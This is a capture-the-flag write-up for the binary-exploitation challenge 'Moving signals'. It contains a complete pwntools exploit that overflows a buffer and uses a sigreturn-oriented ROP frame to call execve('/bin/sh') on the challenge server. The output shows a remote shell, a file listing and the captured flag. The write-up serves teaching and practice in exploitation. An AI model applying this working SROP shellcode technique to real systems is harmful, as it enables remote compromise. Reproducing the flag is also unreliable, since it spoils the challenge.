## Moving signals

```
We don't like giving binaries that contain loads of information, so we decided that a small program should do for this challenge. Even written in some custom assembly. I wonder how this could be exploited.

EU instance: 161.97.176.150 2525

US instance: 185.172.165.118 2525

author: Tango
```

Tags: _srop_ _x86-64_ _pwn_ _bof_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./moving-signals')

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
#pwn tools failed to find string, lame
#frame.rdi = next(binary.search(b'/bin/sh'))
#work around
frame.rdi = binary.address + binary.data.find(b'/bin/sh')
frame.rsi = 0
frame.rdx = 0
frame.rip = next(binary.search(asm('syscall')))

pop_rax = next(binary.search(asm('pop rax; ret')))
syscall = next(binary.search(asm('syscall')))

payload  = b''
payload += 8 * b'A'
payload += p64(pop_rax)
payload += p64(constants.SYS_rt_sigreturn)
payload += p64(syscall)
payload += bytes(frame)

if args.REMOTE:
	p = remote('185.172.165.118', 2525)
else:
	p = process(binary.path)

p.sendline(payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/misc/moving-singals/moving-signals'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x40000)
    RWX:      Has RWX segments
[+] Opening connection to 185.172.165.118 on port 2525: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 32
-rw-r--r-- 1 root root    28 Jan 14 10:52 flag.txt
-rwxr-xr-x 1 root root  4696 Jan 11 13:25 moving-signals
-rwxr-xr-x 1 root root 18744 Jan 22 09:41 ynetd
$ cat flag.txt
flag{s1gROPp1ty_r0p_321321}
```
